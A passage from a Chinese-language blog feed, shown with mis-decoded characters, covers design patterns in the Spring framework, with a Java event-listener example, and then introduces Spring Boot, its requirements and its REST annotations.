<li>å®šä¹‰ä¸€ä¸ªäº‹ä»¶: å®ç°ä¸€ä¸ªç»§æ‰¿è‡ª <code>ApplicationEvent</code>ï¼Œå¹¶ä¸”å†™ç›¸åº”çš„æ„é€ å‡½æ•°ï¼›</li>
<li>å®šä¹‰ä¸€ä¸ªäº‹ä»¶ç›‘å¬è€…ï¼šå®ç° <code>ApplicationListener</code> æ¥å£ï¼Œé‡å†™ <code>onApplicationEvent()</code> æ–¹æ³•ï¼›</li>
<li>ä½¿ç”¨äº‹ä»¶å‘å¸ƒè€…å‘å¸ƒæ¶ˆæ¯:  å¯ä»¥é€šè¿‡ <code>ApplicationEventPublisher  </code> çš„ <code>publishEvent()</code> æ–¹æ³•å‘å¸ƒæ¶ˆæ¯ã€‚</li>
</ol>
<p>Example:</p>
<div><pre><code><span>// å®šä¹‰ä¸€ä¸ªäº‹ä»¶,ç»§æ‰¿è‡ªApplicationEventå¹¶ä¸”å†™ç›¸åº”çš„æ„é€ å‡½æ•°</span>
<span>public</span> <span>class</span> <span>DemoEvent</span> <span>extends</span> <span>ApplicationEvent</span><span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>long</span> serialVersionUID <span>=</span> <span>1L</span><span>;</span>

    <span>private</span> <span>String</span> message<span>;</span>

    <span>public</span> <span>DemoEvent</span><span>(</span><span>Object</span> source<span>,</span><span>String</span> message<span>)</span><span>{</span>
        <span>super</span><span>(</span>source<span>)</span><span>;</span>
        <span>this</span><span>.</span>message <span>=</span> message<span>;</span>
    <span>}</span>

    <span>public</span> <span>String</span> <span>getMessage</span><span>(</span><span>)</span> <span>{</span>
         <span>return</span> message<span>;</span>
          <span>}</span>

    
<span>// å®šä¹‰ä¸€ä¸ªäº‹ä»¶ç›‘å¬è€…,å®ç°ApplicationListeneræ¥å£ï¼Œé‡å†™ onApplicationEvent() æ–¹æ³•ï¼›</span>
<span>@Component</span>
<span>public</span> <span>class</span> <span>DemoListener</span> <span>implements</span> <span>ApplicationListener</span><span><span>&lt;</span><span>DemoEvent</span><span>></span></span><span>{</span>

    <span>//ä½¿ç”¨onApplicationEventæ¥æ”¶æ¶ˆæ¯</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onApplicationEvent</span><span>(</span><span>DemoEvent</span> event<span>)</span> <span>{</span>
        <span>String</span> msg <span>=</span> event<span>.</span><span>getMessage</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"æ¥æ”¶åˆ°çš„ä¿¡æ¯æ˜¯ï¼š"</span><span>+</span>msg<span>)</span><span>;</span>
    <span>}</span>

<span>}</span>
<span>// å‘å¸ƒäº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡ApplicationEventPublisher  çš„ publishEvent() æ–¹æ³•å‘å¸ƒæ¶ˆæ¯ã€‚</span>
<span>@Component</span>
<span>public</span> <span>class</span> <span>DemoPublisher</span> <span>{</span>

    <span>@Autowired</span>
    <span>ApplicationContext</span> applicationContext<span>;</span>

    <span>public</span> <span>void</span> <span>publish</span><span>(</span><span>String</span> message<span>)</span><span>{</span>
        <span>//å‘å¸ƒäº‹ä»¶</span>
        applicationContext<span>.</span><span>publishEvent</span><span>(</span><span>new</span> <span>DemoEvent</span><span>(</span><span>this</span><span>,</span> message<span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br></div></div><p>å½“è°ƒç”¨ <code>DemoPublisher </code> çš„ <code>publish()</code> æ–¹æ³•çš„æ—¶å€™ï¼Œæ¯”å¦‚ <code>demoPublisher.publish(&quot;ä½ å¥½&quot;)</code> ï¼Œæ§åˆ¶å°å°±ä¼šæ‰“å°å‡º:<code>æ¥æ”¶åˆ°çš„ä¿¡æ¯æ˜¯ï¼šä½ å¥½</code> ã€‚</p>
<h2 id="é€‚é…å™¨æ¨¡å¼" tabindex="-1"> é€‚é…å™¨æ¨¡å¼</h2>
<p>é€‚é…å™¨æ¨¡å¼(Adapter Pattern) å°†ä¸€ä¸ªæ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦ä¸€ä¸ªæ¥å£ï¼Œé€‚é…å™¨æ¨¡å¼ä½¿æ¥å£ä¸å…¼å®¹çš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œï¼Œå…¶åˆ«åä¸ºåŒ…è£…å™¨(Wrapper)ã€‚</p>
<h3 id="spring-aopä¸­çš„é€‚é…å™¨æ¨¡å¼" tabindex="-1"> spring AOPä¸­çš„é€‚é…å™¨æ¨¡å¼</h3>
<p>æˆ‘ä»¬çŸ¥é“ Spring AOP çš„å®ç°æ˜¯åŸºäºä»£ç†æ¨¡å¼ï¼Œä½†æ˜¯ Spring AOP çš„å¢å¼ºæˆ–é€šçŸ¥(Advice)ä½¿ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼ï¼Œä¸ä¹‹ç›¸å…³çš„æ¥å£æ˜¯<code>AdvisorAdapter </code> ã€‚Advice å¸¸ç”¨çš„ç±»å‹æœ‰ï¼š<code>BeforeAdvice</code>ï¼ˆç›®æ ‡æ–¹æ³•è°ƒç”¨å‰,å‰ç½®é€šçŸ¥ï¼‰ã€<code>AfterAdvice</code>ï¼ˆç›®æ ‡æ–¹æ³•è°ƒç”¨å,åç½®é€šçŸ¥ï¼‰ã€<code>AfterReturningAdvice</code>(ç›®æ ‡æ–¹æ³•æ‰§è¡Œç»“æŸåï¼Œreturnä¹‹å‰)ç­‰ç­‰ã€‚æ¯ä¸ªç±»å‹Adviceï¼ˆé€šçŸ¥ï¼‰éƒ½æœ‰å¯¹åº”çš„æ‹¦æˆªå™¨:<code>MethodBeforeAdviceInterceptor</code>ã€<code>AfterReturningAdviceAdapter</code>ã€<code>AfterReturningAdviceInterceptor</code>ã€‚Springé¢„å®šä¹‰çš„é€šçŸ¥è¦é€šè¿‡å¯¹åº”çš„é€‚é…å™¨ï¼Œé€‚é…æˆ <code>MethodInterceptor</code>æ¥å£(æ–¹æ³•æ‹¦æˆªå™¨)ç±»å‹çš„å¯¹è±¡ï¼ˆå¦‚ï¼š<code>MethodBeforeAdviceInterceptor</code> è´Ÿè´£é€‚é… <code>MethodBeforeAdvice</code>ï¼‰ã€‚</p>
<h2 id="è£…é¥°è€…æ¨¡å¼" tabindex="-1"> è£…é¥°è€…æ¨¡å¼</h2>
<p>è£…é¥°è€…æ¨¡å¼å¯ä»¥åŠ¨æ€åœ°ç»™å¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„å±æ€§æˆ–è¡Œä¸ºã€‚ç›¸æ¯”äºä½¿ç”¨ç»§æ‰¿ï¼Œè£…é¥°è€…æ¨¡å¼æ›´åŠ çµæ´»ã€‚ç®€å•ç‚¹å„¿è¯´å°±æ˜¯å½“æˆ‘ä»¬éœ€è¦ä¿®æ”¹åŸæœ‰çš„åŠŸèƒ½ï¼Œä½†æˆ‘ä»¬åˆä¸æ„¿ç›´æ¥å»ä¿®æ”¹åŸæœ‰çš„ä»£ç æ—¶ï¼Œè®¾è®¡ä¸€ä¸ªDecoratorå¥—åœ¨åŸæœ‰ä»£ç å¤–é¢ã€‚å…¶å®åœ¨ JDK ä¸­å°±æœ‰å¾ˆå¤šåœ°æ–¹ç”¨åˆ°äº†è£…é¥°è€…æ¨¡å¼ï¼Œæ¯”å¦‚ <code>InputStream</code>å®¶æ—ï¼Œ<code>InputStream</code> ç±»ä¸‹æœ‰ <code>FileInputStream</code> (è¯»å–æ–‡ä»¶)ã€<code>BufferedInputStream</code> (å¢åŠ ç¼“å­˜,ä½¿è¯»å–æ–‡ä»¶é€Ÿåº¦å¤§å¤§æå‡)ç­‰å­ç±»éƒ½åœ¨ä¸ä¿®æ”¹<code>InputStream</code> ä»£ç çš„æƒ…å†µä¸‹æ‰©å±•äº†å®ƒçš„åŠŸèƒ½ã€‚</p>
<p><img src="@source/assets/cs-note/framework/spring/Decorator.png" alt="è£…é¥°è€…æ¨¡å¼ç¤ºæ„å›¾" loading="lazy"></p>
<p>Spring ä¸­é…ç½® DataSource çš„æ—¶å€™ï¼ŒDataSource å¯èƒ½æ˜¯ä¸åŒçš„æ•°æ®åº“å’Œæ•°æ®æºã€‚æˆ‘ä»¬èƒ½å¦æ ¹æ®å®¢æˆ·çš„éœ€æ±‚åœ¨å°‘ä¿®æ”¹åŸæœ‰ç±»çš„ä»£ç ä¸‹åŠ¨æ€åˆ‡æ¢ä¸åŒçš„æ•°æ®æºï¼Ÿè¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°è£…é¥°è€…æ¨¡å¼(è¿™ä¸€ç‚¹æˆ‘è‡ªå·±è¿˜æ²¡å¤ªç†è§£å…·ä½“åŸç†)ã€‚Spring ä¸­ç”¨åˆ°çš„åŒ…è£…å™¨æ¨¡å¼åœ¨ç±»åä¸Šå«æœ‰ <code>Wrapper</code>æˆ–è€… <code>Decorator</code>ã€‚è¿™äº›ç±»åŸºæœ¬ä¸Šéƒ½æ˜¯åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£</p>
<h2 id="æ€»ç»“" tabindex="-1"> æ€»ç»“</h2>
<p>Spring æ¡†æ¶ä¸­ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ</p>
<ul>
<li><strong>å·¥å‚è®¾è®¡æ¨¡å¼</strong> : Springä½¿ç”¨å·¥å‚æ¨¡å¼é€šè¿‡ <code>BeanFactory</code>ã€<code>ApplicationContext</code> åˆ›å»º bean å¯¹è±¡ã€‚</li>
<li><strong>ä»£ç†è®¾è®¡æ¨¡å¼</strong> : Spring AOP åŠŸèƒ½çš„å®ç°ã€‚</li>
<li><strong>å•ä¾‹è®¾è®¡æ¨¡å¼</strong> : Spring ä¸­çš„ Bean é»˜è®¤éƒ½æ˜¯å•ä¾‹çš„ã€‚</li>
<li><strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong> : Spring ä¸­ <code>jdbcTemplate</code>ã€<code>hibernateTemplate</code> ç­‰ä»¥ Template ç»“å°¾çš„å¯¹æ•°æ®åº“æ“ä½œçš„ç±»ï¼Œå®ƒä»¬å°±ä½¿ç”¨åˆ°äº†æ¨¡æ¿æ¨¡å¼ã€‚</li>
<li><strong>åŒ…è£…å™¨è®¾è®¡æ¨¡å¼</strong> : æˆ‘ä»¬çš„é¡¹ç›®éœ€è¦è¿æ¥å¤šä¸ªæ•°æ®åº“ï¼Œè€Œä¸”ä¸åŒçš„å®¢æˆ·åœ¨æ¯æ¬¡è®¿é—®ä¸­æ ¹æ®éœ€è¦ä¼šå»è®¿é—®ä¸åŒçš„æ•°æ®åº“ã€‚è¿™ç§æ¨¡å¼è®©æˆ‘ä»¬å¯ä»¥æ ¹æ®å®¢æˆ·çš„éœ€æ±‚èƒ½å¤ŸåŠ¨æ€åˆ‡æ¢ä¸åŒçš„æ•°æ®æºã€‚</li>
<li><strong>è§‚å¯Ÿè€…æ¨¡å¼:</strong> Spring äº‹ä»¶é©±åŠ¨æ¨¡å‹å°±æ˜¯è§‚å¯Ÿè€…æ¨¡å¼å¾ˆç»å…¸çš„ä¸€ä¸ªåº”ç”¨ã€‚</li>
<li><strong>é€‚é…å™¨æ¨¡å¼</strong> :Spring AOP çš„å¢å¼ºæˆ–é€šçŸ¥(Advice)ä½¿ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼ã€spring MVC ä¸­ä¹Ÿæ˜¯ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼é€‚é…<code>Controller</code>ã€‚</li>
<li>......</li>
</ul>
<h1 id="spring-æºç é˜…è¯»" tabindex="-1"> Spring æºç é˜…è¯»</h1>
<p>ä¸‹é¢çš„æ˜¯Githubä¸Šçš„ä¸€ä¸ªå¼€æºçš„Springæºç é˜…è¯»</p>
<ul>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/Spring.md" target="_blank" rel="noopener noreferrer">spring-core</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-aop.md" target="_blank" rel="noopener noreferrer">spring-aop</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-context.md" target="_blank" rel="noopener noreferrer">spring-context</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-task.md" target="_blank" rel="noopener noreferrer">spring-task</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-transaction.md" target="_blank" rel="noopener noreferrer">spring-transaction</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-mvc.md" target="_blank" rel="noopener noreferrer">spring-mvc</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/guava-cache.md" target="_blank" rel="noopener noreferrer">guava-cache</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">SpringBoot ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[ 
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>
 
<h1 id="springboot-ä»‹ç»" tabindex="-1"> SpringBoot ä»‹ç»</h1>
<h2 id="spring-ä¸è¶³" tabindex="-1"> Spring ä¸è¶³</h2>
<p>Springæ˜¯é‡é‡çº§ä¼ä¸šå¼€å‘æ¡†æ¶ Enterprise JavaBeanï¼ˆEJBï¼‰ çš„æ›¿ä»£å“ï¼ŒSpringä¸ºä¼ä¸šçº§Javaå¼€å‘æä¾›äº†ä¸€ç§ç›¸å¯¹ç®€å•çš„æ–¹æ³•ï¼Œé€šè¿‡ ä¾èµ–æ³¨å…¥ å’Œ é¢å‘åˆ‡é¢ç¼–ç¨‹ ï¼Œç”¨ç®€å•çš„ Javaå¯¹è±¡ï¼ˆPlain Old Java Objectï¼ŒPOJOï¼‰ å®ç°äº†EJBçš„åŠŸèƒ½</p>
<p>è™½ç„¶Springçš„ç»„ä»¶ä»£ç æ˜¯è½»é‡çº§çš„ï¼Œä½†å®ƒçš„é…ç½®å´æ˜¯é‡é‡çº§çš„ï¼ˆéœ€è¦å¤§é‡XMLé…ç½®ï¼‰ ã€‚Spring 2.5å¼•å…¥äº†åŸºäºæ³¨è§£çš„ç»„ä»¶æ‰«æï¼Œè¿™æ¶ˆé™¤äº†å¤§é‡é’ˆå¯¹åº”ç”¨ç¨‹åºè‡ªèº«ç»„ä»¶çš„æ˜¾å¼XMLé…ç½®ã€‚Spring 3.0å¼•å…¥äº†åŸºäºJavaçš„é…ç½®ï¼Œè¿™æ˜¯ä¸€ç§ç±»å‹å®‰å…¨çš„å¯é‡æ„é…ç½®æ–¹å¼ï¼Œå¯ä»¥ä»£æ›¿XMLã€‚</p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¾æ—§æ²¡èƒ½é€ƒè„±é…ç½®çš„é­”çˆªã€‚å¼€å¯æŸäº›Springç‰¹æ€§æ—¶ï¼Œæ¯”å¦‚äº‹åŠ¡ç®¡ç†å’ŒSpring MVCï¼Œè¿˜æ˜¯éœ€è¦ç”¨XMLæˆ–Javaè¿›è¡Œæ˜¾å¼é…ç½®ã€‚å¯ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶ä¹Ÿéœ€è¦æ˜¾å¼é…ç½®ï¼Œæ¯”å¦‚åŸºäºThymeleafçš„Webè§†å›¾ã€‚é…ç½®Servletå’Œè¿‡æ»¤å™¨ï¼ˆæ¯”å¦‚Springçš„DispatcherServletï¼‰åŒæ ·éœ€è¦åœ¨web.xmlæˆ–Servletåˆå§‹åŒ–ä»£ç é‡Œè¿›è¡Œæ˜¾å¼é…ç½®ã€‚ç»„ä»¶æ‰«æå‡å°‘äº†é…ç½®é‡ï¼ŒJavaé…ç½®è®©å®ƒçœ‹ä¸Šå»ç®€æ´ä¸å°‘ï¼Œä½†Springè¿˜æ˜¯éœ€è¦ä¸å°‘é…ç½®ã€‚</p>
<h2 id="spring-boot-çš„å¼•å…¥" tabindex="-1"> Spring Boot çš„å¼•å…¥</h2>
<p><strong>å®˜æ–¹ä»‹ç»</strong></p>
<blockquote>
<p>Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can â€œjust runâ€...Most Spring Boot applications need very little Spring configuration.</p>
<p>Spring Bootå¯ä»¥è½»æ¾åˆ›å»ºç‹¬ç«‹çš„ç”Ÿäº§çº§åŸºäºSpringçš„åº”ç”¨ç¨‹åº,åªè¦é€šè¿‡ â€œjust runâ€ï¼ˆå¯èƒ½æ˜¯run â€˜Applicationâ€™æˆ–java -jar æˆ– tomcat æˆ– mavenæ’ä»¶run æˆ– shellè„šæœ¬ï¼‰ä¾¿å¯ä»¥è¿è¡Œé¡¹ç›®ã€‚å¤§éƒ¨åˆ†Spring Booté¡¹ç›®åªéœ€è¦å°‘é‡çš„é…ç½®å³å¯)</p>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œä»æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒSpring Bootå°±æ˜¯Springï¼Œå®ƒåšäº†é‚£äº›æ²¡æœ‰å®ƒä½ è‡ªå·±ä¹Ÿä¼šå»åšçš„Spring Beané…ç½®ã€‚</p>
<p>Spring Frameworkæ—¨åœ¨ç®€åŒ–J2EEä¼ä¸šåº”ç”¨ç¨‹åºå¼€å‘ã€‚Spring Boot Frameworkæ—¨åœ¨ç®€åŒ–Springå¼€å‘ã€‚</p>
<h3 id="spring-bootä¼˜ç‚¹" tabindex="-1"> Spring Bootä¼˜ç‚¹</h3>
<ol>
<li>å¼€å‘åŸºäº Spring çš„åº”ç”¨ç¨‹åºå¾ˆå®¹æ˜“ã€‚</li>
<li>Spring Boot é¡¹ç›®æ‰€éœ€çš„å¼€å‘æˆ–å·¥ç¨‹æ—¶é—´æ˜æ˜¾å‡å°‘ï¼Œé€šå¸¸ä¼šæé«˜æ•´ä½“ç”Ÿäº§åŠ›ã€‚</li>
<li>Spring Bootä¸éœ€è¦ç¼–å†™å¤§é‡æ ·æ¿ä»£ç ã€XMLé…ç½®å’Œæ³¨é‡Šã€‚</li>
<li>Springå¼•å¯¼åº”ç”¨ç¨‹åºå¯ä»¥å¾ˆå®¹æ˜“åœ°ä¸Springç”Ÿæ€ç³»ç»Ÿé›†æˆï¼Œå¦‚Spring JDBCã€Spring ORMã€Spring Dataã€Spring Securityç­‰ã€‚</li>
<li>Spring Bootéµå¾ªâ€œå›ºæ‰§å·±è§çš„é»˜è®¤é…ç½®â€ï¼Œä»¥å‡å°‘å¼€å‘å·¥ä½œï¼ˆé»˜è®¤é…ç½®å¯ä»¥ä¿®æ”¹ï¼‰ã€‚</li>
<li>Spring Boot åº”ç”¨ç¨‹åºæä¾›åµŒå…¥å¼HTTPæœåŠ¡å™¨ï¼Œå¦‚Tomcatå’ŒJettyï¼Œå¯ä»¥è½»æ¾åœ°å¼€å‘å’Œæµ‹è¯•webåº”ç”¨ç¨‹åºã€‚ï¼ˆè¿™ç‚¹å¾ˆèµï¼æ™®é€šè¿è¡ŒJavaç¨‹åºçš„æ–¹å¼å°±èƒ½è¿è¡ŒåŸºäºSpring Boot web é¡¹ç›®ï¼Œçœäº‹å¾ˆå¤šï¼‰</li>
<li>Spring Bootæä¾›å‘½ä»¤è¡Œæ¥å£(CLI)å·¥å…·ï¼Œç”¨äºå¼€å‘å’Œæµ‹è¯•Spring Bootåº”ç”¨ç¨‹åºï¼Œå¦‚Javaæˆ–Groovyã€‚</li>
<li>Spring Bootæä¾›äº†å¤šç§æ’ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®å·¥å…·(å¦‚Mavenå’ŒGradle)å¼€å‘å’Œæµ‹è¯•Spring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<h2 id="spring-boot-ç¯å¢ƒè¦æ±‚" tabindex="-1"> Spring Boot ç¯å¢ƒè¦æ±‚</h2>
<h3 id="jdk" tabindex="-1"> JDK</h3>
<p>æˆªæ­¢åˆ°ç›®å‰Spring Boot çš„æœ€æ–°ç‰ˆæœ¬ï¼š2.1.8.RELEASE è¦æ±‚ JDK ç‰ˆæœ¬åœ¨ 1.8 ä»¥ä¸Šï¼Œæ‰€ä»¥ç¡®ä¿ä½ çš„ç”µè„‘å·²ç»æ­£ç¡®ä¸‹è½½å®‰è£…é…ç½®äº† JDKï¼ˆæ¨è JDK 1.8 ç‰ˆæœ¬ï¼‰ã€‚</p>
<h3 id="æ„å»ºå·¥å…·" tabindex="-1"> æ„å»ºå·¥å…·</h3>
<p>æ„å»ºå·¥å…·(æœ¬é¡¹ç›®æ¶‰åŠçš„ä»£ç å¤§éƒ¨åˆ†ä¼šé‡‡ç”¨ Maven ä½œä¸ºåŒ…ç®¡ç†å·¥å…·):</p>
<table>
<thead>
<tr>
<th>Build Tool</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Maven</td>
<td>3.3+</td>
</tr>
<tr>
<td>Gradle</td>
<td>4.4+</td>
</tr>
</tbody>
</table>
<h3 id="å¼€å‘å·¥å…·æ¨è" tabindex="-1"> å¼€å‘å·¥å…·æ¨è</h3>
<p>æ¨èä½¿ç”¨ IDEA è¿›è¡Œå¼€å‘ã€‚æœ€å¥½çš„ Java åå°å¼€å‘ç¼–è¾‘å™¨ï¼Œæ²¡æœ‰ä¹‹ä¸€ï¼</p>
<h3 id="web-æœåŠ¡å™¨" tabindex="-1"> Web æœåŠ¡å™¨</h3>
<p>Spring Bootæ”¯æŒä»¥ä¸‹åµŒå…¥å¼servletå®¹å™¨:</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Servlet Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Tomcat 9.0</td>
<td>4.0</td>
</tr>
<tr>
<td>Jetty 9.4</td>
<td>3.1</td>
</tr>
<tr>
<td>Undertow 2.0</td>
<td>4.0</td>
</tr>
</tbody>
</table>
<p>æ‚¨è¿˜å¯ä»¥å°†Springå¼•å¯¼åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°ä»»ä½•Servlet 3.1+å…¼å®¹çš„ Web å®¹å™¨ä¸­ã€‚</p>
<p>è¿™å°±æ˜¯ä½ ä¸ºä»€ä¹ˆå¯ä»¥é€šè¿‡ç›´æ¥åƒè¿è¡Œ æ™®é€š Java é¡¹ç›®ä¸€æ ·è¿è¡Œ SpringBoot é¡¹ç›®ã€‚è¿™æ ·çš„ç¡®çœäº‹äº†å¾ˆå¤šï¼Œæ–¹ä¾¿äº†æˆ‘ä»¬è¿›è¡Œå¼€å‘ï¼Œé™ä½äº†å­¦ä¹ éš¾åº¦ã€‚</p>
<h1 id="spring-boot-å¼€å‘" tabindex="-1"> Spring Boot å¼€å‘</h1>
<h2 id="restful-web-æœåŠ¡å¼€å‘" tabindex="-1"> RESTful Web æœåŠ¡å¼€å‘</h2>
<h3 id="restful-web-æœåŠ¡ä»‹ç»" tabindex="-1"> RESTful Web æœåŠ¡ä»‹ç»</h3>
<p>RESTful Web æœåŠ¡ä¸ä¼ ç»Ÿçš„ MVC å¼€å‘ä¸€ä¸ªå…³é”®åŒºåˆ«æ˜¯è¿”å›ç»™å®¢æˆ·ç«¯çš„å†…å®¹çš„åˆ›å»ºæ–¹å¼ï¼š<strong>ä¼ ç»Ÿçš„ MVC æ¨¡å¼å¼€å‘ä¼šç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ªè§†å›¾ï¼Œä½†æ˜¯ RESTful Web æœåŠ¡ä¸€èˆ¬ä¼šå°†è¿”å›çš„æ•°æ®ä»¥ JSON çš„å½¢å¼è¿”å›ï¼Œè¿™ä¹Ÿå°±æ˜¯ç°åœ¨æ‰€æ¨å´‡çš„å‰åç«¯åˆ†ç¦»å¼€å‘ã€‚</strong></p>
<h3 id="å¸¸ç”¨æ³¨è§£" tabindex="-1"> å¸¸ç”¨æ³¨è§£</h3>
<ol>
<li><code>@RestController</code>  **å°†è¿”å›çš„å¯¹è±¡æ•°æ®ç›´æ¥ä»¥ JSON æˆ– XML å½¢å¼å†™å…¥ HTTP å“åº”(Response)ä¸­ã€‚**ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯ç›´æ¥ä»¥  JSON å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå¾ˆå°‘çš„æƒ…å†µä¸‹æ‰ä¼šä»¥ XML å½¢å¼è¿”å›ã€‚è½¬æ¢æˆ XML å½¢å¼è¿˜éœ€è¦é¢ä¸ºçš„å·¥ä½œï¼Œä¸Šé¢ä»£ç ä¸­æ¼”ç¤ºçš„ç›´æ¥å°±æ˜¯å°†å¯¹è±¡æ•°æ®ç›´æ¥ä»¥ JSON å½¢å¼å†™å…¥ HTTP å“åº”(Response)ä¸­ã€‚å…³äº<code>@Controller</code>å’Œ<code>@RestController</code> çš„å¯¹æ¯”ï¼Œæˆ‘ä¼šåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­å•ç‹¬ä»‹ç»åˆ°ï¼ˆ<code>@Controller</code> +<code>@ResponseBody</code>= <code>@RestController</code>ï¼‰ã€‚</li>
<li><code>@RequestMapping</code> :ä¸Šé¢çš„ç¤ºä¾‹ä¸­æ²¡æœ‰æŒ‡å®š GET ä¸ PUTã€POST ç­‰ï¼Œå› ä¸º**<code>@RequestMapping</code>é»˜è®¤æ˜ å°„æ‰€æœ‰HTTP Action**ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>@RequestMapping(method=ActionType)</code>æ¥ç¼©å°è¿™ä¸ªæ˜ å°„ã€‚</li>
<li><code>@PostMapping</code>å®é™…ä¸Šå°±ç­‰ä»·äº <code>@RequestMapping(method = RequestMethod.POST)</code>ï¼ŒåŒæ ·çš„ <code> @DeleteMapping</code> ,<code>@GetMapping</code>ä¹Ÿéƒ½ä¸€æ ·ï¼Œå¸¸ç”¨çš„ HTTP Action éƒ½æœ‰ä¸€ä¸ªè¿™ç§å½¢å¼çš„æ³¨è§£æ‰€å¯¹åº”ã€‚</li>
<li><code>@PathVariable</code> :å–urlåœ°å€ä¸­çš„å‚æ•°ã€‚<code>@RequestParam </code> urlçš„æŸ¥è¯¢å‚æ•°å€¼ã€‚</li>
<li><code>@RequestBody</code>:å¯ä»¥<strong>å°† HttpRequest body ä¸­çš„ JSON ç±»å‹æ•°æ®ååºåˆ—åŒ–ä¸ºåˆé€‚çš„ Java ç±»å‹ã€‚</strong></li>
<li><code>ResponseEntity</code>: <strong>è¡¨ç¤ºæ•´ä¸ªHTTP Responseï¼šçŠ¶æ€ç ï¼Œæ ‡å¤´å’Œæ­£æ–‡å†…å®¹</strong>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥è‡ªå®šä¹‰HTTP Response çš„å†…å®¹ã€‚</li>
</ol>
<h3 id="restcontroller-vs-controller" tabindex="-1"> @RestController vs @Controller</h3>
<p>å•ç‹¬ä½¿ç”¨ <code>@Controller</code> ä¸åŠ  <code>@ResponseBody</code>çš„è¯ä¸€èˆ¬ä½¿ç”¨åœ¨è¦è¿”å›ä¸€ä¸ªè§†å›¾çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µå±äºæ¯”è¾ƒä¼ ç»Ÿçš„Spring MVC çš„åº”ç”¨ï¼Œå¯¹åº”äºå‰åç«¯ä¸åˆ†ç¦»çš„æƒ…å†µã€‚</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVCä¼ ç»Ÿå·¥ä½œæµç¨‹.png" alt="SpringMVC ä¼ ç»Ÿå·¥ä½œæµç¨‹" loading="lazy"></p>
